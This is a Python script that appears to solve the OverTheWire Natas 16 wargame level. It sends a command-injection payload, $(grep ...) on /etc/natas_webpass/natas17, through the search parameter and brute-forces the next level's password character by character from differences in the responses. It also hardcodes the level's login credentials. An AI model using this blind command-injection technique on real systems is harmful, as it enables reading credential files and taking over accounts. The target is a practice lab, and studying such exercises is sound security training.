import requests
from requests.auth import HTTPBasicAuth
import string

chars = "8Ps3H0GWbn5rd9S7GmAdgQNdkhP"
nodone = True
while nodone:
    nodone = False
    for i in string.ascii_lowercase+string.ascii_uppercase+string.digits:
        checking = chars + i
        # print (checking)
        res = requests.get("http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+^{0}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search".format(checking), auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if ('African' not in res.text):
            chars += i
            print ("So far: " + chars)
            nodone = True
            break
 
print ("Final: " + chars)
        